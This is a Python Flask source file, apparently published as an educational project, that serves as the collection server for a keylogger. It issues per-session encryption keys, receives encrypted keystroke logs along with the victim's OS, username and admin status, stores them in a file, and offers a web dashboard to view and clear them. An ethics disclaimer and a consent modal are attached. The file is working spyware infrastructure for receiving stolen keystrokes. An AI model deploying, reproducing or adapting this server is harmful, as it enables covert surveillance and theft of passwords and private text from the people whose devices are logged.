'''
Keylogger Server by SudoHopeX

A Flask server to handle encrypted logs from a keylogger.
Provides endpoints to get encryption keys and receive encrypted logs.
Also includes a web interface to view and clear received logs.
'''

'''
MIT License
Copyright (c) 2025 SudoHopeX

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software for educational and ethical use only, including without limitation the rights
to use, copy, modify, merge, publish (without any cost), and distribute copies of the Software at no cost, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

This software is strictly for educational and ethical purposes. Any person wishing to use it for malicious purposes is kindly requested not to use it.
The software may not be sold or sublicensed without explicit written permission from the copyright holder.

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

from flask import Flask, request, render_template_string, abort, redirect, url_for, jsonify
from cryptography.fernet import Fernet
import json
import base64
import time
import threading
import os

app = Flask(__name__)


# Store active keys with their creation timestamps
# Format: {key_id: (key, timestamp)}
active_keys = {}
KEY_EXPIRY_TIME = 360   # 6 minutes in seconds
LOG_FILE = "/tmp/received_logs.txt"  # received logs file path only for vercel deployment

def cleanup_old_keys():
    """Remove expired keys periodically"""
    while True:
        current_time = time.time()
        expired_keys = [
            kid for kid, (_, timestamp) in active_keys.items()
            if current_time - timestamp > KEY_EXPIRY_TIME
        ]
        for kid in expired_keys:
            active_keys.pop(kid, None)
        time.sleep(60)  # Clean up every minute

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_keys, daemon=True)
cleanup_thread.start()


@app.route('/get_key', methods=['GET'])
def get_encryption_key():
    try:
        # Generate new Fernet key
        key = Fernet.generate_key()
        key_id = base64.urlsafe_b64encode(os.urandom(8)).decode('ascii')

        # Store key with timestamp
        active_keys[key_id] = (key, time.time())

        # Return key and its ID
        return jsonify({
            'key': base64.b64encode(key).decode('ascii'),
            'key_id': key_id
        }), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/receive_logs', methods=['POST'])
def receive_logs():
    try:
        data = request.get_json()
        # print(data)
        if not data or 'encrypted_data' not in data or 'key_id' not in data:
            # print(data, "Missing required fields")   # for debugging
            return jsonify({'error': 'Missing required fields'}), 400

        # Get key using key_id
        key_info = active_keys.get(data['key_id'])
        if not key_info:
            return jsonify({'error': 'Invalid or expired key'}), 401

        key, _ = key_info
        cipher_suite = Fernet(key)

        # Decrypt data
        encrypted_data = base64.b64decode(data['encrypted_data'])
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        log_data = json.loads(decrypted_data.decode('utf-8'))

        # print("Received log data:", log_data)  # For debugging
        # Write to log file
        with open(LOG_FILE, "a") as f:
            if 'user_os' in log_data:
                f.write("User OS : " + log_data['user_os'] + "\n")
                f.write("Username : " + log_data['username'] + "\n")
                f.write("Username is Admin : " + str(log_data['username_admin']) + "\n")
            f.write(log_data['logs'] + "\n")

        # Remove used key
        active_keys.pop(data['key_id'], None)
        return jsonify({'status': 'success'}), 200

    except Exception as e:
        # print("COde: 500, error:", e)
        return jsonify({'error': str(e)}), 500

# Home route to display logs and provide option to clear them
@app.route('/', methods=['GET'])
def home():
    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()
    except FileNotFoundError:
        content = "No logs found."
    except Exception as e:
        return f"Error reading log file: {e}", 500


    html_template = """
        <!doctype html>
        <html>
          <head>
            <meta charset="utf-8">
            <link rel="icon" type="image/x-icon" href="https://sudohopex.github.io/img/SudoHopeX.jpg"/>
            <title>Logs - SudoHopeX Keystroke logger Simulation</title>
            <style>
              :root{
                --bg: #f7f7f7;
                --card: #ffffff;
                --muted: #6b7280;
                --accent: #2563eb;
                --accent-hover: #1e40af;
                --border: #e5e7eb;
              }
        
              body{
                font-family: Inter, Roboto, "Segoe UI", system-ui, monospace;
                background: var(--bg);
                margin: 0;
                padding: 24px;
                color: #111827;
              }
        
              /* Header row: title + action aligned horizontally */
              .header-row{
                display: flex;
                align-items: center;        /* vertical centering */
                justify-content: space-between; /* push elements to ends */
                gap: 16px;
                margin-bottom: 12px;
                flex-wrap: wrap; /* keeps layout tidy on narrow screens */
              }
        
              .header-row h1{
                font-size: 1.25rem;
                margin: 0;
                font-weight: 600;
              }
        
              .controls{
                display: flex;
                gap: 8px;
                align-items: center;
              }
        
              /* Button styling */
              .btn {
                display: inline-flex;
                align-items: center;
                gap: 8px;
                padding: 8px 12px;
                border-radius: 8px;
                border: 1px solid var(--border);
                background: var(--card);
                cursor: pointer;
                font-weight: 600;
                color: var(--accent);
                transition: background .12s, color .12s, box-shadow .12s, transform .06s;
              }
              .btn:hover{ color: var(--accent-hover); box-shadow: 0 4px 12px rgba(16,24,40,0.06); transform: translateY(-1px); }
              .btn:active{ transform: translateY(0); }
              .btn:focus{ outline: 3px solid rgba(37,99,235,0.12); outline-offset: 2px; }
        
              /* Danger variant */
              .btn-danger{
                color: #b91c1c;
                border-color: #fca5a5;
              }
              .btn-danger:hover{ color: #7f1d1d; }
        
              .log-box{
                background: var(--card);
                border: 1px solid var(--border);
                padding: 14px;
                max-height: 60vh;
                overflow: auto;
                white-space: pre-wrap;
                font-family: monospace;
                border-radius: 8px;
              }
        
              /* small helper text */
              .muted{ color: var(--muted); font-size: 0.875rem; }
            </style>
          </head>
          <body>
            <div class="header-row">
              <h1>Keylogger's Logs</h1>
        
              <!-- form is inline and lightweight; keep method=post as before -->
              <div class="controls">
                <form method="post" action="{{ url_for('clear_logs') }}"
                      onsubmit="return confirm('Clear logs? This cannot be undone.');"
                      style="margin:0;">
                  <button class="btn btn-danger" type="submit">Clear Logs</button>
                </form>
        
                <!-- optional: a small helper or timestamp -->
                <div class="muted">Showing latest entries</div>
              </div>
            </div>
        
            <div class="log-box">{{ logs }}</div>
            
            <!-- WARNING MODEL -->
            <style>
              /* modal overlay */
              .edu-modal-backdrop {
                position: fixed;
                inset: 0;
                background: rgba(15, 23, 42, 0.6);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 9999;
              }
              .edu-modal {
                width: 92%;
                max-width: 720px;
                background: #fff;
                border-radius: 12px;
                padding: 20px;
                box-shadow: 0 10px 30px rgba(2,6,23,0.3);
                font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
                color: #0f172a;
              }
              .edu-modal h2 { margin: 0 0 8px 0; font-size: 1.125rem; }
              .edu-modal p { margin: 8px 0 12px 0; color: #374151; line-height: 1.4; }
              .edu-modal .note { font-size: 0.95rem; color: #6b7280; margin-bottom: 14px; }
              .edu-modal .controls { display:flex; gap:12px; align-items:center; justify-content:flex-end; flex-wrap:wrap; }
              .edu-checkbox { display:flex; gap:8px; align-items:center; font-size:0.95rem; color:#111827; }
              .edu-btn {
                padding: 8px 12px;
                border-radius: 8px;
                border: 1px solid #e5e7eb;
                background: #ffffff;
                cursor: pointer;
                font-weight: 600;
              }
              .edu-btn.primary {
                background: #2563eb;
                color: white;
                border-color: transparent;
              }
              .edu-btn.primary[disabled] { opacity: 0.5; cursor: not-allowed; }
              .edu-link { font-size:0.9rem; color:#2563eb; text-decoration: none; }
              @media (max-width:420px){
                .edu-modal { padding:14px; }
                .edu-modal h2 { font-size:1rem; }
              }
            </style>
            
            <div id="eduModalBackdrop" class="edu-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="eduModalTitle">
              <div class="edu-modal" role="document">
                <h2 id="eduModalTitle">Important — Educational & Ethical Use Only</h2>
                <p>
                  This project is provided for learning and research purposes only. It <strong>must not</strong> be used
                  to capture or exfiltrate data from other people's devices or accounts, or for any form of surveillance, harassment,
                  or unauthorized access. Misuse is illegal and unethical.
                  
                  Regards ~ SudoHopeX
                </p>
                <p class="note">
                  By continuing you confirm that you will use this project only on systems you own or where you have explicit permission,
                  and that you understand the legal and ethical responsibilities involved.
                </p>
            
                <div style="display:flex; align-items:center; gap:12px; justify-content:space-between; flex-wrap:wrap;">
                  <label class="edu-checkbox" style="flex:1; min-width:200px;">
                    <input id="eduAcknowledge" type="checkbox" aria-describedby="eduModalTitle" />
                    <span>I acknowledge and will use this only for legitimate, authorized learning.</span>
                  </label>
            
                  <div class="controls" style="margin-left:12px;">
                    <button id="eduCancelBtn" class="edu-btn" type="button" onclick="eduDecline()">Decline</button>
                    <button id="eduAcceptBtn" class="edu-btn primary" type="button" onclick="eduAccept()" disabled>Accept & Continue</button>
                  </div>
                </div>
            
                <div style="margin-top:12px; display:flex; gap:10px; flex-wrap:wrap;">
                  <a class="edu-link" href="https://www.eff.org/" target="_blank" rel="noopener noreferrer">Ethics & privacy resources</a>
                  <span style="color:#6b7280; font-size:0.9rem;">•</span>
                  <a class="edu-link" href="https://www.owasp.org/" target="_blank" rel="noopener noreferrer">Security best practices</a>
                </div>
              </div>
            </div>
            
            <script>
              (function() {
                const backdrop = document.getElementById('eduModalBackdrop');
                const checkbox = document.getElementById('eduAcknowledge');
                const acceptBtn = document.getElementById('eduAcceptBtn');
            
                // If user already acknowledged in this session, hide modal
                try {
                  if (sessionStorage.getItem('edu_acknowledged') === '1') {
                    backdrop.style.display = 'none';
                  }
                } catch (e) {
                  // ignore storage errors
                }
            
                // enable accept when box checked
                checkbox.addEventListener('change', () => {
                  acceptBtn.disabled = !checkbox.checked;
                });
            
                // Accept: hide modal and remember in session storage
                window.eduAccept = function() {
                  try {
                    sessionStorage.setItem('edu_acknowledged', '1');
                  } catch (e) { /* ignore */ }
                  backdrop.style.display = 'none';
                };
            
                // Decline: navigate away (or you can change this to close tab)
                window.eduDecline = function() {
                  // simple behavior: close modal and redirect to about:blank
                  // change this if you'd prefer a different action
                  try {
                    sessionStorage.removeItem('edu_acknowledged');
                  } catch (e) {}
                  // close tab to discourage continued use:
                   window.location = 'about:blank';
                };
            
                // Accessibility: trap focus inside modal while visible
                document.addEventListener('focus', function(e) {
                  if (backdrop.style.display !== 'none') {
                    if (!backdrop.contains(e.target)) {
                      e.stopPropagation();
                      backdrop.querySelector('input, button, a').focus();
                    }
                  }
                }, true);
              })();
            </script>

          </body>
        </html>
        """

    return render_template_string(html_template, logs=content)


@app.route("/clear_logs", methods=["POST"])
def clear_logs():
    try:
        # truncate the file (keeps file path)
        open(LOG_FILE, "w", encoding="utf-8").close()

        return redirect(url_for("home"))
    except Exception as e:
        return f"Error clearing logs: {e}", 500



if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
